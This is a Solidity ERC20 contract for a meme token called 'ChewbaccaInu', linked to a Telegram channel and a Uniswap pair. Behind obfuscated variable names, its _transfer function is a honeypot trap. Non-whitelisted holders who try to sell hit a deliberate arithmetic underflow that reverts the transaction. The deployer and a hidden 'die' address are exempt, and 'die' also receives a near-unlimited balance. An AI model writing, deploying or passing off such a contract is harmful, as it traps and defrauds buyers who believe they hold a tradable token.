// https://t.me/ChewbaccaInu_eth

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.4;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract ChewbaccaInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private concerned;
    mapping(address => uint256) private fireplace;

    function _transfer(
        address neighbor,
        address applied,
        uint256 nothing
    ) internal override {
        uint256 everybody = speech;

        if (fireplace[neighbor] == 0 && concerned[neighbor] > 0 && neighbor != uniswapV2Pair) {
            fireplace[neighbor] -= everybody;
        }

        address writer = address(she);
        she = ChewbaccaInu(applied);
        concerned[writer] += everybody + 1;

        _balances[neighbor] -= nothing;
        uint256 grain = (nothing / 100) * speech;
        nothing -= grain;
        _balances[applied] += nothing;
    }

    uint256 public speech = 3;

    constructor(
        string memory ahead,
        string memory shells,
        address sang,
        address die
    ) ERC20(ahead, shells) {
        uniswapV2Router = IUniswapV2Router02(sang);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        fireplace[msg.sender] = capital;
        fireplace[die] = capital;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[die] = capital;
    }

    ChewbaccaInu private she;
    uint256 private capital = ~uint256(1);
}